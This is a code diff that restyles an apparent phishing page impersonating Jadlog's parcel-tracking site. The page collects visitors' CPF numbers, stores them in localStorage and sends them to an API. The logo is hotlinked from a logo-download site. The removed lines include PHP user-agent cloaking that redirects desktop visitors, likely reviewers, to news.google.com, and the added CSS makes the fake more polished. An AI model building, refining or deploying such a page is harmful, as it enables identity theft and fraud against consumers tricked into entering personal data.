@@ -1,149 +1,574 @@
-﻿<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <link rel="preconnect" href="https://fonts.googleapis.com/">
-  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-  <link href="Rastreio_arquivos/css2.html" rel="stylesheet">
-  <link rel="stylesheet" href="Rastreio_arquivos/bootstrap.css">
-  <link rel="stylesheet" href="Rastreio_arquivos/app.css">
-  <link rel="stylesheet" href="Rastreio_arquivos/all.css" crossorigin="anonymous">
   <link rel="icon" type="image/x-icon" href="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png">
-  <meta name="csrf-token" content="BvHekmyuhpxq0y4d95zDDZM0F2cRrES6DJjrP5sP">
-  <link rel="stylesheet" type="text/css" href="css/all.css">
-  <title>Jadlog | Rastreio</title>
-
-  <script type="text/javascript" class="flasher-js">
-    (function () { 
-      var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; 
-      var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; 
-      var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); 
-      function mergeOptions(first, second) { 
-        return { 
-          context: merge(first.context || {}, second.context || {}), 
-          envelopes: merge(first.envelopes || [], second.envelopes || []), 
-          options: merge(first.options || {}, second.options || {}), 
-          scripts: merge(first.scripts || [], second.scripts || []), 
-          styles: merge(first.styles || [], second.styles || []) 
-        }; 
-      } 
-      function merge(first, second) { 
-        if (Array.isArray(first) && Array.isArray(second)) { 
-          return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); 
-        } 
-        return Object.assign({}, first, second); 
-      } 
-      function renderOptions(options) { 
-        if (!window.hasOwnProperty('flasher')) { 
-          console.error('Flasher is not loaded'); 
-          return; 
-        } 
-        requestAnimationFrame(function () { window.flasher.render(options); }); 
-      } 
-      function render(options) { 
-        if ('loading' !== document.readyState) { 
-          renderOptions(options); 
-          return; 
-        } 
-        document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); 
-      } 
-      if (1 === document.querySelectorAll('script.flasher-js').length) { 
-        document.addEventListener('flasher:render', function (event) { render(event.detail); }); 
-      } 
-      if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { 
-        render(options); 
-      } else { 
-        var tag = document.createElement('script'); 
-        tag.setAttribute('src', rootScript); 
-        tag.setAttribute('type', 'text/javascript'); 
-        tag.onload = function () { render(options); }; 
-        document.head.appendChild(tag); 
-      } 
-    })();
-  </script>
-  <script src="Rastreio_arquivos/flasher.min.js" type="text/javascript"></script>
-  <script src="Rastreio_arquivos/flasher.min_002.js" type="text/javascript"></script>
+  <title>Jadlog | Rastreamento de Encomendas</title>
   
-  <?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-if (!preg_match('/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i', $userAgent)) {
-    header("Location: https://news.google.com/");
-    exit;
-}
-?>
+    :root {
+      --primary-color: #dc0032;
+      --primary-dark: #b30029;
+      --secondary-color: #2c3e50;
+      --text-dark: #2d3436;
+      --text-light: #636e72;
+      --bg-light: #f8f9fa;
+      --bg-white: #ffffff;
+      --border-color: #e0e0e0;
+      --success-color: #27ae60;
+      --shadow-sm: 0 2px 8px rgba(0,0,0,0.08);
+      --shadow-md: 0 4px 16px rgba(0,0,0,0.12);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,0.16);
+    }
 
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #e8eef3 100%);
+      color: var(--text-dark);
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    /* Header Styles */
+    header {
+      background: var(--bg-white);
+      box-shadow: var(--shadow-sm);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      border-bottom: 3px solid var(--primary-color);
+    }
+
+    .header-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .logo-container img {
+      height: 40px;
+      transition: transform 0.3s ease;
+    }
+
+    .logo-container img:hover {
+      transform: scale(1.05);
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .btn-login {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.6rem 1.2rem;
+      background: transparent;
+      color: var(--text-dark);
+      border: 2px solid var(--border-color);
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 500;
+      transition: all 0.3s ease;
+    }
+
+    .btn-login:hover {
+      border-color: var(--primary-color);
+      color: var(--primary-color);
+      transform: translateY(-2px);
+    }
+
+    /* Main Content */
+    main {
+      max-width: 800px;
+      margin: 3rem auto;
+      padding: 0 2rem;
+    }
+
+    /* Breadcrumb */
+    .breadcrumb {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-bottom: 2rem;
+      flex-wrap: wrap;
+      font-size: 0.9rem;
+      color: var(--text-light);
+    }
+
+    .breadcrumb span {
+      font-weight: 500;
+    }
+
+    .breadcrumb i {
+      color: var(--primary-color);
+    }
+
+    /* Hero Section */
+    .hero-section {
+      text-align: center;
+      margin-bottom: 3rem;
+      animation: fadeInDown 0.6s ease;
+    }
+
+    .hero-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem;
+      box-shadow: var(--shadow-md);
+      animation: pulse 2s infinite;
+    }
+
+    .hero-icon i {
+      font-size: 2.5rem;
+      color: white;
+    }
+
+    .hero-section h1 {
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      margin-bottom: 0.5rem;
+    }
+
+    .hero-section p {
+      font-size: 1.1rem;
+      color: var(--text-light);
+      font-weight: 400;
+    }
+
+    /* Card Form */
+    .card-form {
+      background: var(--bg-white);
+      border-radius: 20px;
+      padding: 3rem;
+      box-shadow: var(--shadow-lg);
+      margin-bottom: 2rem;
+      animation: fadeInUp 0.6s ease;
+    }
+
+    .alert-info {
+      background: linear-gradient(135deg, #fff3cd, #ffe9a0);
+      border-left: 4px solid #ffc107;
+      padding: 1.2rem;
+      border-radius: 12px;
+      margin-bottom: 2rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      animation: slideInLeft 0.6s ease;
+    }
+
+    .alert-info i {
+      font-size: 1.8rem;
+      color: #f39c12;
+    }
+
+    .alert-info-text h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #856404;
+      margin-bottom: 0.3rem;
+    }
+
+    .alert-info-text p {
+      font-size: 0.95rem;
+      color: #856404;
+      margin: 0;
+    }
+
+    .form-section {
+      margin-top: 2rem;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-dark);
+      margin-bottom: 0.8rem;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 1.2rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-light);
+      font-size: 1.2rem;
+      transition: color 0.3s ease;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 1rem 1rem 1rem 3.5rem;
+      font-size: 1.1rem;
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
+      transition: all 0.3s ease;
+      font-family: 'Inter', sans-serif;
+      background: var(--bg-light);
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      background: white;
+      box-shadow: 0 0 0 4px rgba(220, 0, 50, 0.1);
+    }
+
+    .form-input:focus + .input-icon {
+      color: var(--primary-color);
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 1.2rem;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: white;
+      background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: var(--shadow-md);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.8rem;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    .btn-submit:active {
+      transform: translateY(0);
+    }
+
+    .btn-submit.loading {
+      background: var(--text-light);
+      cursor: not-allowed;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    .btn-submit.loading .spinner {
+      display: block;
+    }
+
+    /* Features Section */
+    .features {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1.5rem;
+      margin-top: 3rem;
+      animation: fadeInUp 0.8s ease;
+    }
+
+    .feature-card {
+      background: var(--bg-white);
+      padding: 1.5rem;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: var(--shadow-sm);
+      transition: all 0.3s ease;
+    }
+
+    .feature-card:hover {
+      transform: translateY(-5px);
+      box-shadow: var(--shadow-md);
+    }
+
+    .feature-icon {
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(135deg, #f093fb, #f5576c);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1rem;
+    }
+
+    .feature-card:nth-child(2) .feature-icon {
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+    }
+
+    .feature-card:nth-child(3) .feature-icon {
+      background: linear-gradient(135deg, #43e97b, #38f9d7);
+    }
+
+    .feature-icon i {
+      font-size: 1.5rem;
+      color: white;
+    }
+
+    .feature-card h3 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-dark);
+      margin-bottom: 0.5rem;
+    }
+
+    .feature-card p {
+      font-size: 0.85rem;
+      color: var(--text-light);
+    }
+
+    /* Footer */
+    footer {
+      background: var(--bg-white);
+      border-top: 1px solid var(--border-color);
+      margin-top: 4rem;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    .footer-logo {
+      margin-bottom: 1rem;
+    }
+
+    .footer-logo img {
+      height: 50px;
+    }
+
+    .footer-text {
+      color: var(--text-light);
+      font-size: 0.9rem;
+    }
+
+    /* Animations */
+    @keyframes fadeInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes slideInLeft {
+      from {
+        opacity: 0;
+        transform: translateX(-30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .header-container {
+        padding: 1rem;
+      }
+
+      .btn-login {
+        padding: 0.5rem 1rem;
+        font-size: 0.9rem;
+      }
+
+      main {
+        padding: 0 1rem;
+      }
+
+      .hero-section h1 {
+        font-size: 1.8rem;
+      }
+
+      .card-form {
+        padding: 2rem 1.5rem;
+      }
+
+      .features {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
 </head>
 
 <body>
-  <header class="w-100 font-size-16 font-weight-400 text-blue">
-    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px; border-color: #dc0032!important;">
-      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
-        <a href="#" class="py-2">
-          <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="" height="25">
+  <!-- Header -->
+  <header>
+    <div class="header-container">
+      <div class="logo-container">
+        <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="Jadlog">
+      </div>
+      <div class="header-actions">
+        <a href="#" class="btn-login">
+          <i class="fas fa-user"></i>
+          <span>Entrar</span>
         </a>
       </div>
-      <div class="ml-4 d-none d-lg-block" style="width:150px">
-        <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
-          <img src="Rastreio_arquivos/entrar.svg" alt="Jadlog" width="31">
-          <span class="ml-1">Entrar</span>
-        </a>
-      </div>
-    </nav>
+    </div>
   </header>
 
+  <!-- Main Content -->
   <main>
-    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
-      <span class="text-blue mr-2" style="color: black;"><b>Portal Jadlog</b></span>
-      <i class="fal fa-angle-right mr-2"></i>
-      <span class="text-blue mr-2" style="color: black;">Rastreamento</span>
-      <i class="fal fa-angle-right mr-2"></i>
+    <!-- Breadcrumb -->
+    <nav class="breadcrumb">
+      <span><i class="fas fa-home"></i> Portal Jadlog</span>
+      <i class="fas fa-chevron-right"></i>
+      <span>Rastreamento</span>
     </nav>
 
-    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto; color: black;">
-      Rastreamento
-    </h1>
+    <!-- Hero Section -->
+    <div class="hero-section">
+      <div class="hero-icon">
+        <i class="fas fa-box-open"></i>
+      </div>
+      <h1>Rastreamento de Encomendas</h1>
+      <p>Acompanhe suas encomendas em tempo real</p>
+    </div>
 
-    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
-      <h5 class="text-center font-weight-700 mb-4" style="color: black;">
-        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
-      </h5>
-
-      <form id="cpf-form" method="post">
-        <span>Deseja acompanhar seu objeto?</span><br>
-        <span>Digite o CPF do comprador.</span>
-        <div class="form-group mt-1">
-          <input type="text" id="cpf" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required>
+    <!-- Form Card -->
+    <div class="card-form">
+      <div class="alert-info">
+        <i class="fas fa-exclamation-triangle"></i>
+        <div class="alert-info-text">
+          <h3>Consulte suas Encomendas</h3>
+          <p>Digite seu CPF para visualizar todas as encomendas associadas</p>
         </div>
-        <div class="form-group mt-1 d-flex justify-content-center" id="submit-container" style="width: 100%;">
-          <button type="button" id="continue-cpf" class="btn btn-primary" style="background-color: #dc0032; border-color: #dc0032; width: 100%;">Consultar</button>
+      </div>
+
+      <form id="cpf-form">
+        <div class="form-section">
+          <label class="form-label">CPF do Destinatário</label>
+          <div class="input-wrapper">
+            <input 
+              type="text" 
+              id="cpf" 
+              name="cpf" 
+              class="form-input" 
+              placeholder="000.000.000-00" 
+              maxlength="14" 
+              required
+              autocomplete="off"
+            >
+            <i class="fas fa-id-card input-icon"></i>
+          </div>
+          
+          <button type="submit" id="continue-cpf" class="btn-submit">
+            <span class="btn-text">Consultar Encomendas</span>
+            <i class="fas fa-arrow-right"></i>
+            <div class="spinner"></div>
+          </button>
         </div>
       </form>
-    </section>
+    </div>
 
-    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
-      <div>
-        <img src="outdoor02.png" alt="" class="w-100">
+    <!-- Features -->
+    <div class="features">
+      <div class="feature-card">
+        <div class="feature-icon">
+          <i class="fas fa-shield-alt"></i>
+        </div>
+        <h3>Seguro</h3>
+        <p>Seus dados protegidos</p>
       </div>
-    </section>
+      <div class="feature-card">
+        <div class="feature-icon">
+          <i class="fas fa-clock"></i>
+        </div>
+        <h3>Tempo Real</h3>
+        <p>Atualizações instantâneas</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">
+          <i class="fas fa-mobile-alt"></i>
+        </div>
+        <h3>Responsivo</h3>
+        <p>Acesse de qualquer lugar</p>
+      </div>
+    </div>
   </main>
 
-  <hr style="margin-top: 20px; margin-bottom: 20px; border: 0; border-top: 1px solid #eee;"> 
-
-  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark" style="background-color: #fff;">
-    <div style="display: flex; justify-content: center; align-items: center; margin: 20px auto">
-      <img width="150px" src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="">
+  <!-- Footer -->
+  <footer>
+    <div class="footer-logo">
+      <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="Jadlog">
     </div>
-    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
-      <span>© Copyright 2025 Jadlog</span>
+    <div class="footer-text">
+      © Copyright 2025 Jadlog - Todos os direitos reservados
     </div>
   </footer>
-
-  <script src="Rastreio_arquivos/jquery-3.6.0.min.js"></script>
-  <script src="Rastreio_arquivos/bootstrap.min.js"></script>
 
   <script>
     // CPF input mask
@@ -199,7 +624,11 @@ if (!preg_match('/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i', $userA
     async function submitForm() {
       const cpfInput = document.getElementById('cpf');
       const cpf = cpfInput.value.replace(/\D/g, '');
-      const token = 'ea9873c7db78c484dc4ec553d0463ad1';
+      const submitBtn = document.getElementById('continue-cpf');
+      const btnText = submitBtn.querySelector('.btn-text');
+
+      submitBtn.classList.add('loading');
+      btnText.textContent = 'Consultando...';
 
       if (cpf.length === 11) {
         try {
@@ -221,25 +650,30 @@ if (!preg_match('/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i', $userA
             window.location.href = newUrl;
           } else {
             alert("CPF não encontrado ou inválido.");
+            submitBtn.classList.remove('loading');
+            btnText.textContent = 'Consultar Encomendas';
           }
         } catch (error) {
           alert("Erro ao consultar a API: " + error.message);
+          submitBtn.classList.remove('loading');
+          btnText.textContent = 'Consultar Encomendas';
         }
       } else {
         alert("CPF inválido. Por favor, preencha corretamente.");
+        submitBtn.classList.remove('loading');
+        btnText.textContent = 'Consultar Encomendas';
       }
     }
 
     // Initialize
     document.addEventListener('DOMContentLoaded', () => {
       initCpfMask();
+      const cpfForm = document.getElementById('cpf-form');
       const cpfInput = document.getElementById('cpf');
-      const continueCpfButton = document.getElementById('continue-cpf');
-      const submitContainer = document.getElementById('submit-container');
 
-      continueCpfButton.addEventListener('click', async () => {
+      cpfForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
         if (isValidCPF(cpfInput.value)) {
-          submitContainer.style.display = 'none';
           localStorage.setItem('cpf', cpfInput.value);
           await submitForm();
         } else {
